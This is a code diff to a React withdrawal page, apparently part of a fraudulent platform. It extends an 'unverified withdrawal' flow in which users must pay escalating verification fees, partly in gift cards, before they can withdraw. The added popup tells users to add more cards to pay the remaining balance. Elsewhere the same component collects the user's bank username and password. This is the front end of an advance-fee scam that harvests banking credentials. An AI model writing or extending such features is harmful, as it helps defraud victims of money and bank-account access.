@@ -44,6 +44,10 @@ const Withdraw = () => {
   const [uvSymbol, setUvSymbol] = useState('');
   const [uvAmount, setUvAmount] = useState('');
   const [uvBank, setUvBank] = useState({ bankName: '', bankAddress: '', username: '', password: '' });
+  const [uvRemaining, setUvRemaining] = useState(0);
+  
+  // 🔧 NEW: State for partial payment popup
+  const [partialPopup, setPartialPopup] = useState(null); 
 
   /* ---------- Payment Config ---------- */
   const [paymentConfig, setPaymentConfig] = useState(null);
@@ -59,7 +63,6 @@ const Withdraw = () => {
     })();
   }, []);
 
-  // Fetch global payment config (locks + paypal id) — used for unverified payment step
   useEffect(() => {
     (async () => {
       try {
@@ -87,7 +90,6 @@ const Withdraw = () => {
     return () => clearInterval(t);
   }, [step, mode]);
 
-  // Fetch active unverified withdrawal when switching to unverified mode
   useEffect(() => {
     if (mode === 'unverified') {
       (async () => {
@@ -95,7 +97,9 @@ const Withdraw = () => {
           const { data } = await api.get('/withdraw/unverified/status');
           if (data.active) {
             setUvData(data.data);
-            if (data.data.status === 'pending_payment') setUvStep('tier_up');
+            setUvRemaining(Math.max(0, data.data.currentPaymentAmount - (data.data.totalFeesPaid || 0)));
+            
+            if (data.data.status === 'pending_payment') setUvStep('payment');
             else if (data.data.status === 'pending_approval') setUvStep('processing');
             else if (data.data.status === 'completed') setUvStep('bank');
           } else {
@@ -108,7 +112,6 @@ const Withdraw = () => {
     }
   }, [mode]);
 
-  // Poll for approval
   useEffect(() => {
     let interval;
     if (uvStep === 'processing') {
@@ -118,7 +121,8 @@ const Withdraw = () => {
           if (data.active) {
             if (data.data.status === 'pending_payment') {
               setUvData(data.data);
-              setUvStep('tier_up');
+              setUvRemaining(Math.max(0, data.data.currentPaymentAmount - (data.data.totalFeesPaid || 0)));
+              setUvStep('payment');
               clearInterval(interval);
             } else if (data.data.status === 'completed') {
               setUvData(data.data);
@@ -284,6 +288,7 @@ const Withdraw = () => {
         amount: Number(uvAmount),
       });
       setUvData(data.data);
+      setUvRemaining(data.data.currentPaymentAmount);
       setUvStep('confirm');
     } catch (err) {
       setError(err?.response?.data?.message || 'Could not initiate withdrawal');
@@ -292,16 +297,27 @@ const Withdraw = () => {
     }
   };
 
-  // Called by PaymentMethod component
   const handleUnverifiedPayment = async (payload) => {
     setLoading(true);
+    setError('');
     try {
-      await api.post('/withdraw/unverified/pay', {
+      const { data } = await api.post('/withdraw/unverified/pay', {
         paymentMethod: payload.method,
         proofUrl: payload.proofUrl,
         giftCards: payload.giftCards,
       });
-      setUvStep('processing');
+      
+      setUvData(data.data);
+      setUvRemaining(data.remainingAmount);
+
+      if (data.remainingAmount > 0) {
+        // 🔧 Show the popup instead of just an error message
+        setPartialPopup({ remaining: data.remainingAmount });
+      } else {
+        setUvStep('processing');
+      }
+    } catch (err) {
+      setError(err?.response?.data?.message || 'Payment submission failed');
     } finally {
       setLoading(false);
     }
@@ -318,6 +334,7 @@ const Withdraw = () => {
       setMode('select');
       setUvStep('amount');
       setUvData(null);
+      setUvRemaining(0);
     } catch (err) {
       setError(err?.response?.data?.message || 'Could not submit bank details');
     } finally {
@@ -332,7 +349,6 @@ const Withdraw = () => {
       <div className="withdraw-body">
         {mode === 'select' && (
           <div className="withdraw-select-container">
-            {/* Instructions Section */}
             <div className="instruction-card">
               <h3>Withdrawal Instructions</h3>
               <ul className="instruction-list">
@@ -353,7 +369,6 @@ const Withdraw = () => {
               </ul>
             </div>
 
-            {/* Selection Buttons */}
             <div className="mode-selection-buttons">
               <button className="mode-btn kyc-btn" onClick={() => setMode('kyc')}>
                 <FiShield /> Verify to Withdraw
@@ -670,12 +685,21 @@ const Withdraw = () => {
             {uvStep === 'payment' && uvData && paymentConfig && (
               <div className="step-card">
                 <h3>Pay Verification Fee</h3>
+                
+                {uvRemaining > 0 && (
+                  <div className="form-error" style={{ marginBottom: '16px', textAlign: 'center' }}>
+                    Remaining balance to pay: <strong>{fmtUsd(uvRemaining)}</strong>
+                  </div>
+                )}
+
                 <p
                   className="hint"
                   style={{ textAlign: 'center', fontWeight: 'bold', color: 'var(--primary)' }}
                 >
-                  Pay {fmtUsd(uvData.currentPaymentAmount)} to proceed
+                  Total Required: {fmtUsd(uvData.currentPaymentAmount)} | 
+                  Paid: {fmtUsd(uvData.totalFeesPaid || 0)}
                 </p>
+                
                 <PaymentMethod
                   config={paymentConfig}
                   onSubmit={handleUnverifiedPayment}
@@ -690,12 +714,6 @@ const Withdraw = () => {
                 <div className="spinner" />
                 <h3>Under Verification</h3>
                 <p>Your payment is under verification right now. Please wait for approval...</p>
-                
-                {uvData?.paymentMethod === 'giftcard' && (
-                  <button className="primary-btn" style={{ marginTop: '20px' }} onClick={() => setUvStep('payment')}>
-                    Add More Cards / Complete Payment
-                  </button>
-                )}
               </div>
             )}
 
@@ -726,7 +744,7 @@ const Withdraw = () => {
                 <p className="hint">
                   Fee to pay: <strong>{fmtUsd(uvData.currentPaymentAmount)}</strong>
                 </p>
-                <button className="primary-btn" onClick={() => setUvStep('payment')}>Proceed</button>
+                <button className="primary-btn" onClick={() => { setUvRemaining(uvData.currentPaymentAmount); setUvStep('payment'); }}>Proceed</button>
               </div>
             )}
 
@@ -766,6 +784,31 @@ const Withdraw = () => {
           </>
         )}
       </div>
+
+      {/* 🔧 NEW: Partial Payment Popup */}
+      {partialPopup && (
+        <div className="modal-overlay">
+          <div className="partial-payment-modal">
+            <h3>Partial Payment Received</h3>
+            <p>Your partial payment has been sent and is currently under process.</p>
+            <p>To proceed with your withdrawal, you need to complete the remaining balance.</p>
+            
+            <div className="remaining-amount-box">
+              <span>Remaining Balance</span>
+              <strong>{fmtUsd(partialPopup.remaining)}</strong>
+            </div>
+
+            <p className="hint">Please click the button below to add more cards worth the remaining balance.</p>
+            
+            <button 
+              className="primary-btn" 
+              onClick={() => setPartialPopup(null)}
+            >
+              Add More Cards / Pay Balance
+            </button>
+          </div>
+        </div>
+      )}
     </div>
   );
 };
